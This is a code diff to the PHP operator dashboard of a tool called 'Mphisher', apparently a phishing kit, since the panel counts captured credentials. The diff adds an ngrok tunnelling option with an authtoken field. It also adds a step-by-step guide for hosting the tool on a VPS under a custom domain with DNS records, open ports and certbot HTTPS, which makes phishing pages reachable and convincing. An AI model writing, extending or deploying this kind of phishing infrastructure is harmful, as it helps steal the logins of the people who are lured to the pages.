@@ -36,16 +36,19 @@ $total_creds = count($credentials);
 $domain = "None Connected";
 $conn_type = "direct";
 $tunnel_token = "";
+$ngrok_auth = "";
 
 if (isset($_POST['domain'])) {
     $domain = htmlspecialchars($_POST['domain']);
     $conn_type = htmlspecialchars($_POST['conn_type'] ?? 'direct');
     $tunnel_token = htmlspecialchars($_POST['tunnel_token'] ?? '');
+    $ngrok_auth = htmlspecialchars($_POST['ngrok_auth'] ?? '');
     
     $config_data = [
         'domain' => $domain,
         'conn_type' => $conn_type,
         'tunnel_token' => $tunnel_token,
+        'ngrok_auth' => $ngrok_auth,
         'updated_at' => date('Y-m-d H:i:s')
     ];
     file_put_contents('config.json', json_encode($config_data, JSON_PRETTY_PRINT));
@@ -54,6 +57,7 @@ if (isset($_POST['domain'])) {
     $domain = $config['domain'] ?? "None Connected";
     $conn_type = $config['conn_type'] ?? "direct";
     $tunnel_token = $config['tunnel_token'] ?? "";
+    $ngrok_auth = $config['ngrok_auth'] ?? "";
 }
 
 ?>
@@ -132,6 +136,7 @@ if (isset($_POST['domain'])) {
                             <select name="conn_type" style="width: 100%; background: rgba(0,0,0,0.3); border: 1px solid var(--glass-border); padding: 0.8rem; border-radius: 10px; color: white; margin-bottom: 1rem; outline: none;">
                                 <option value="direct" <?php echo $conn_type == 'direct' ? 'selected' : ''; ?>>Direct (A Record / IP)</option>
                                 <option value="tunnel" <?php echo $conn_type == 'tunnel' ? 'selected' : ''; ?>>Cloudflare Tunnel (Secure)</option>
+                                <option value="ngrok" <?php echo $conn_type == 'ngrok' ? 'selected' : ''; ?>>Ngrok (Custom Domain)</option>
                             </select>
 
                             <label style="font-size: 0.8rem; color: var(--text-secondary); margin-bottom: 5px; display: block;">Custom Domain</label>
@@ -142,6 +147,11 @@ if (isset($_POST['domain'])) {
                                 <input type="text" name="tunnel_token" placeholder="eyJhIjoi..." value="<?php echo $tunnel_token; ?>">
                             </div>
 
+                            <div id="ngrok-field" style="display: <?php echo $conn_type == 'ngrok' ? 'block' : 'none'; ?>;">
+                                <label style="font-size: 0.8rem; color: var(--text-secondary); margin-bottom: 5px; display: block;">Ngrok Authtoken</label>
+                                <input type="text" name="ngrok_auth" placeholder="1234567890abcdef..." value="<?php echo $ngrok_auth; ?>">
+                            </div>
+
                             <button type="submit" class="btn">Save & Connect</button>
                         </div>
                     </form>
@@ -150,6 +160,7 @@ if (isset($_POST['domain'])) {
                 <script>
                     document.querySelector('select[name="conn_type"]').addEventListener('change', function() {
                         document.getElementById('tunnel-field').style.display = this.value === 'tunnel' ? 'block' : 'none';
+                        document.getElementById('ngrok-field').style.display = this.value === 'ngrok' ? 'block' : 'none';
                     });
                 </script>
 
@@ -167,19 +178,33 @@ if (isset($_POST['domain'])) {
                 <div class="panel" style="padding: 1.5rem; margin-top: 1.5rem;">
                     <h3>Domain Setup Guide</h3>
                     <div style="margin-top: 1rem; font-size: 0.85rem; color: var(--text-secondary); line-height: 1.6;">
-                        <p style="margin-bottom: 10px;"><strong style="color: var(--accent-primary);">Cloudflare Tunnel (Recommended):</strong></p>
+                        <p style="margin-bottom: 10px;"><strong style="color: var(--accent-primary);">Cloudflare Tunnel (Termux/Local):</strong></p>
                         <ol style="margin-left: 20px; margin-bottom: 15px;">
                             <li>Go to Cloudflare Zero Trust Dashboard.</li>
                             <li>Navigate to <strong>Networks > Tunnels</strong>.</li>
                             <li>Create a new Tunnel and copy the <strong>Token</strong>.</li>
                             <li>Paste the token above and save.</li>
                         </ol>
-                        <p style="margin-bottom: 10px;"><strong style="color: var(--accent-primary);">Direct A Record:</strong></p>
-                        <ol style="margin-left: 20px;">
-                            <li>Go to your Domain DNS settings.</li>
-                            <li>Add an <strong>A Record</strong> pointing to your server's Public IP.</li>
-                            <li>Wait for DNS propagation (up to 24h).</li>
+
+                        <p style="margin-bottom: 10px;"><strong style="color: var(--accent-primary);">Ngrok (Custom Domain):</strong></p>
+                        <ol style="margin-left: 20px; margin-bottom: 15px;">
+                            <li>Login to <strong>ngrok.com</strong> and copy your <strong>Authtoken</strong>.</li>
+                            <li>Navigate to <strong>Cloud Edge > Domains</strong> and add your domain.</li>
+                            <li>Paste the Authtoken and Domain name above.</li>
                         </ol>
+                        
+                        <div style="background: rgba(255,255,255,0.05); padding: 1rem; border-radius: 12px; border-left: 4px solid var(--accent-secondary);">
+                            <p style="margin-bottom: 10px;"><strong style="color: var(--accent-secondary);">Full VPS Tutorial (Direct IP):</strong></p>
+                            <p style="margin-bottom: 8px;">Follow these steps if you are running Mphisher on a VPS (Ubuntu/Debian):</p>
+                            <ol style="margin-left: 20px; margin-bottom: 10px;">
+                                <li><strong>Get VPS IP:</strong> Run <code>curl ifconfig.me</code> on your VPS terminal.</li>
+                                <li><strong>DNS Setup:</strong> Go to your domain provider (e.g., Namecheap) and add an <strong>A Record</strong> pointing to that IP.</li>
+                                <li><strong>Open Ports:</strong> Run <code>sudo ufw allow 80/tcp</code> to allow traffic.</li>
+                                <li><strong>SSL (Optional):</strong> For HTTPS, install certbot: <code>sudo apt install certbot</code> then <code>sudo certbot certonly --standalone -d yourdomain.com</code>.</li>
+                                <li><strong>Run Mphisher:</strong> Start the tool, select "Custom Domain", and enter your domain name.</li>
+                            </ol>
+                            <p style="font-size: 0.75rem; font-style: italic;">Note: Direct domain connection requires a Public IP, which is available on VPS but not on Android/Termux without a tunnel.</p>
+                        </div>
                     </div>
                 </div>
             </div>
